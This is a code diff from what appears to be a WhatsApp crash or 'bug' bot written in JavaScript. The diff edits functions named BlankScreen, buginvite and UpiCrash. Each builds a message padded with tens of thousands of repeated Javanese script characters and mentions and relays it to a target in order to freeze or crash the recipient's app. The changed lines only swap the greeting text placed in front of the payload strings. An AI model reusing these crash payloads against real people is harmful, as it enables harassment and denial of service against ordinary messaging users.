@@ -2501,7 +2501,7 @@ async function XeonXRobust(target, o, ptcp = true) {
   );
 }
  async function BlankScreen(target, Ptcp = false) {
-let virtex =  "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
+let virtex =  "Assalamualaikum Bang?" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
 			await cay.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -2763,7 +2763,7 @@ async function buginvite(target, ptcp = true) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: `33333333333333333@newsletter`,
-                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
+                        newsletterName: "Assalamualaikum Bang?" + "ꦾ".repeat(120000),
                         jpegThumbnail: "",
                         caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                         inviteExpiration: Date.now() + 1814400000, // 21 hari
@@ -3284,7 +3284,7 @@ async function UpiCrash(target) {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
+                conversation: "Assalamualaikum bang" + "ꦾ࣯࣯".repeat(50000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
